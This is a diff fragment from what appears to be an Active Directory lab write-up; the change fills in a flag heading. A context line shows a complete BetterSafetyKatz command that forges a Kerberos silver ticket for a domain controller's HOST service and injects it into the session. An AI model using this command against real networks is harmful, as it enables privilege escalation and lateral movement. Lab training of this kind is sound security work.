@@ -582,4 +582,4 @@ and with that we can create a silver ticket for the services (in this case HOST)
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
-### **FLAG 23 - **
+### **FLAG 23 - SPN for which a TGS is requested**
